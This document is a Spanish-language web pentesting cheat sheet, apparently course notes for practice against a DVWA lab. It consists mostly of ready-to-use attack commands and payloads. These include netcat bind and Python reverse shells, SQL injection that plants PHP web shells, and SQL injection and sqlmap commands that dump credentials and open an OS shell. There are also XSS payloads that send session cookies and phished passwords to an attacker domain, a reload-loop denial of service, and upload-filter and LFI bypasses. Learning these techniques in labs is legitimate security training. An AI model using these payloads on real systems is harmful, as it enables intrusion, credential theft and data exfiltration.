curl -T [archivo a subir] [IP target] (Prueba si está habilitado PUT para subir un archivo a la IP mandada)

curl --cookie "[cookie]" --location "[url que queramos ejecutar http://192.168.56.101/DVWA/vulnerabilities/csrf/?password_new=&password_conf=&Change=Change#]"

También podemos hacer login poniendo la cookie de sesión y el index del sitio una vez se inicia sesión http://192.168.56.101/DVWA/index.php

security=low; PHPSESSID=261b124tdh0nschc1oqt1nohj2

Si introducimos la url que aparece al hacer un Command Injection o SQL Injection con --data (capturándola con Burp por ejemplo) podemos hacer curl también y redirigir la salida haciendo | tee archivo.txt


mkfifo /tmp/pipe;sh /tmp/pipe | nc -l 4444 > /tmp/pipe Para crear bind nc


SELECT "<?php passthru($_GET['cmd']); ?>" into dumpfile '/var/www/html/shell.php'; Para insertar shell si se tiene acceso con privilegios


http://192.168.56.20/shell.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' Reverse shell hacia la máquina propia


telnet [ip] 80 para banner grabbing


En un formulario, si no esta protegido, podemos poner ; y cortar la orden anterior, y poner ls -la por ejemplo para intentar listar lo que hay

Con SSI (Server Side Includes), siempre que sea archivo shtml podemos ejecutar comandos remotos en el formulario como <!--#exec cmd="ls ../../"-->

En Apache si está disponible el .htaccess tienes directorios ocultos

En formularios, si el valor de lo que se introduce está en texto plano html, se puede modificar desde el debugger del navegador y mandar el formulario de nuevo

Probar en usuarios y contraseñas ' or 1=1;--

Al poder subir archivos, si podemos elegir el nombre del archivo y no se chequea la entrada, podemos subirlos en otras localizaciones usando ../nombreArchivo



XSS -> <script>alert("HOLA");</script>
        <iframe src=http://URL A MOSTRARx></script>
        <script>alert(document.cookie)</script> Para obtener la cookie de sesión
        <script>window.location="http://URL CON ALGO A EJECUTAR, COMO UNA SHELL"</script> Para ejecutar algo de forma remota
            window.location = "http://informatica.ucm.es"; Se puede usar para dejar inaccesible una web en caso de stored xss
            También document.location.href = "http://informatica.ucm.es";
            También location.assign("http://informatica.ucm.es");
            También location.replace("http://informatica.ucm.es");

        Con location.reload(); forzamos el recargado de la página
            <script>
                for (;;)
                    location.reload(); // Y hacemos una denegación de servicio
            </script>

        window.open(URL); Para abrir en nueva pestaña una página.

        <script>
        var password = window.prompt("La sesión ha terminado. Por favor, vuelva a introducir su clave:");
        document.location.href="http://superjuacker.net/leerpass.php?p=" + password;
        </script>

        document.location.href = "http://superjuacker.net/recibir.php?ck="+ document.cookie; Para mandar la cookie a una web nuestra

    Para forzar un persistent xss si se inserta en un campo value se puede hacer "><script>alert();</script> para cerrar el value e introducir el xss.
    También se puede mandar encondeado, o en hexadecimal

        ”><body onLoad="document.location.href='WEB MALICIOSA'"> // Redirige al cargar la página que contiene lo insertado

        ”><meta http-equiv="accion" content="10"; url="WEB MALICIOSA" /> // Redirección al pasar 10 segundos



Para SQL injection con forma "?palabra=3" podemos poner "?palabra=3 union all select *, *, *, ... (las columnas que creamos que tiene) from [tabla que queremos ver]"

Los comentarios pueden ser con -- o con #

Ponemos ' y si es vulnerable, a probar

' order by 1 # E ir probando 10, 20, si da error 15, y vamos acotando, hasta llegar al último que no dé error

' union select 1 -- y luego ' union select 1, 2 -- Hasta que no dé error. Para identificar el parámetro vulnerable, el número que se muestre es el que lo es. Si se muestra el 2, quiere decir que tenemos que pedir los datos en el segundo parámetro

' or '1'='1 union select null, version()# Para ver la versión de la BD
    También user() y database()
    También concat(user,0x3a,password) from 'users' Para acceder a campos internos

' union select 1, @@datadir # Para obtener el directorio de la base de datos, y si es mysql por ejemplo
    @@version Para la versión
    @@port Para el puerto
    @@hostname Para el usuario
    @@version_compile_os Para el SO donde se compiló el programa de gestión de base de datos

    Con LOAD_FILE('[ruta del archivo]') # Podemos leer archivos

' union select distinct(table_schema), null from information_schema.tables -- Para ver las bases de datos que hay


Enumeración de columnas:
' having 1=1-- al no tener el group by, dará error y puede mostrar la columna. Después hacemos ' group by [tabla.columna mostrada] having 1=1-- y mostrará la siguiente. Después concatenamos ' group by [tabla.columna mostrada], [tabla.columna mostrada2] having 1=1-- Hasta que no dé error

Enumeración de tipos de columnas:
' union select sum(COLUMNA) from TABLA -- Y dará error diciendo qué tipo de campo es


' or '1'='1 LIMIT 1 INTO OUTFILE ' /var/www/shell.php' LINES TERMINATED BY '<? system($_REQUEST['cmd']); ?>'-- (Si lo filtra hay que pasarlo a hex, base64, urlencode, ascii hex... Hasta que no lo filtre, en ese caso sin comillas)
Se accede mediante /shell.php?cmd=comando a ejecutar

' union select 1, 2, 3 into dumpfile 'archivo.txt' #


sqlmap
	Importante --tor y --check-tor

	-g [dork]

    sqlmap -u "http://192.168.56.101/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=261b124tdh0nschc1oqt1nohj2" --current-user --current-db

    --string="Surname" Para especificar el campo a emplear

    -U [usuario de la base de datos] --privileges Para listar privilegios del usuario

	-u [url] --dbs (lista las bases de datos)
	quitando --dbs y añadiendo -D [base de datos que queramos consultar] --tables (indica que queremos ver las tablas que tiene)
	quitando --tables y añadiendo -T [tabla a consultar] --columns (muestra las columnas)
	quitando --columns y añadiendo -C [columna a consultar, pudiendo poner varios con coma (user, password)] --dump (muestra los campos de esa columna) o --dump-all (para mostrar todos los de esa tabla, database o columna seleccionada)

	--random-agent simula petición aleatoria de cualquier navegador

    --hostname devuelve el nombre de la maquina objetivo

    --is-dba devuelve si el usuario con el que ejecutamos las sentencias SQL es root o no

    --os-shell se usa si el anterior ha devuelto True y devuelve una ventana de comandos en el sistema objetivo

    --current-db muestra el DBMS actual

    --users muestra los usuarios de la base de datos

    --passwords muestra las contraseñas de los usuarios anteriores


LFI => Si queremos enlazar un archivo y vemos que le adjunta una extensión automáticamente, llamarlo sin extensión y que se ponga después


wpscan 	NO ADMITE SITIOS .WORDPRESS.COM
	--url [url] --enumerate p (plugins)
	en vez de p, vp para plugins vulnerables
	vt para temas vulnerables
	u enumera usernames


php://filter/convert.base64-encode/resource=index

Para bypassear filtro de extensión, poner .nuevaExtension
Para bypassear filtro MIME, para imagen poner GIF al inicio de la shell
